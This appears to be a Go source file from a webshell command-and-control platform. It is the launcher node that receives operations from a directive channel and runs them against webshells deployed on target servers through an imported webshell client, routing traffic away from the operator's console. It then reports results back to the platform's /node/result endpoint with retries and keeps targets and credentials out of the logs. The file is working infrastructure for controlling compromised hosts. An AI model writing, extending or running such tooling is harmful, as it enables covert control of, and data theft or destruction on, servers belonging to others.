package main

// Shell operations (docs/18): the directive channel hands this launcher one
// operation against a deployed shell, the embedded client runs it here — the
// traffic to the target leaves this host, not the console — and the answer
// goes back on /node/result. The credential lives for the call and is never
// logged.

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/c1ayooo/4zrcin/internal/enroll"
	"github.com/c1ayooo/4zwebshell/webshell"
)

const (
	// shellRequestTimeout bounds one exchange with the target shell.
	shellRequestTimeout = 20 * time.Second
	// shellTaskTimeout bounds one operation: a removal is three exchanges.
	shellTaskTimeout = 2 * time.Minute
	// shellConcurrency is how many operations one launcher runs at once.
	shellConcurrency = 4
	// shellResultTries bounds the delivery of one answer.
	shellResultTries = 3
)

// shellSlots caps the shell operations this launcher runs at once.
var shellSlots = make(chan struct{}, shellConcurrency)

// startShellTask takes one operation off the directive loop, so a slow target
// never holds back the next instruction (uninstall included). It returns as
// soon as the task is accepted.
func startShellTask(ctx context.Context, cfg *Config, task enroll.ShellTask) {
	if !task.NotAfter.IsZero() && time.Now().After(task.NotAfter) {
		// The platform stopped waiting. An operation nobody is waiting for is
		// not run: it may have been a write or a delete.
		go postShellResult(ctx, cfg, enroll.ShellResult{RequestID: task.RequestID, Error: "操作已过期，未执行"})
		return
	}
	go func() {
		select {
		case shellSlots <- struct{}{}:
		case <-ctx.Done():
			return
		}
		defer func() { <-shellSlots }()
		res, err := runShellTask(ctx, task)
		out := enroll.ShellResult{RequestID: task.RequestID, Result: &res}
		if err != nil {
			out.Error = err.Error()
		}
		// The kind and the outcome only: neither the target nor the credential
		// belongs in a log line.
		if err != nil {
			log.Printf("shell 操作 %s 失败", task.Op.Kind)
		} else {
			log.Printf("shell 操作 %s 完成", task.Op.Kind)
		}
		postShellResult(ctx, cfg, out)
	}()
}

func runShellTask(ctx context.Context, task enroll.ShellTask) (webshell.Result, error) {
	ctx, cancel := context.WithTimeout(ctx, shellTaskTimeout)
	defer cancel()
	return webshell.Run(ctx, webshell.NewDeepClient(shellRequestTimeout), task.URL, task.Credential, task.Op)
}

// postShellResult delivers one answer with a few tries: the platform is
// waiting on it, and an operation that ran must not read as a timeout only
// because one POST was lost.
func postShellResult(ctx context.Context, cfg *Config, res enroll.ShellResult) {
	body, err := json.Marshal(res)
	if err != nil {
		log.Printf("shell 回执无法编码：%v", err)
		return
	}
	backoff := time.Second
	for tries := 0; ; tries++ {
		err := postShellResultOnce(ctx, cfg, body)
		switch {
		case err == nil, errors.Is(err, errRevoked), ctx.Err() != nil, tries+1 >= shellResultTries:
			return
		}
		log.Printf("shell 回执发送失败：%v；%s 后重试", err, backoff)
		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff):
		}
		backoff *= 2
	}
}

func postShellResultOnce(ctx context.Context, cfg *Config, body []byte) error {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, strings.TrimRight(cfg.PublicURL, "/")+"/node/result", bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+cfg.Credential)
	req.Header.Set("Content-Type", "application/json")
	resp, err := (&http.Client{Timeout: 30 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()                               //nolint:errcheck
	io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20)) //nolint:errcheck
	switch resp.StatusCode {
	case http.StatusOK:
		return nil
	case http.StatusNotFound:
		// Nobody is waiting for it any more: there is nothing left to deliver.
		return nil
	case http.StatusGone, http.StatusUnauthorized:
		return errRevoked
	}
	return fmt.Errorf("平台响应 %d", resp.StatusCode)
}
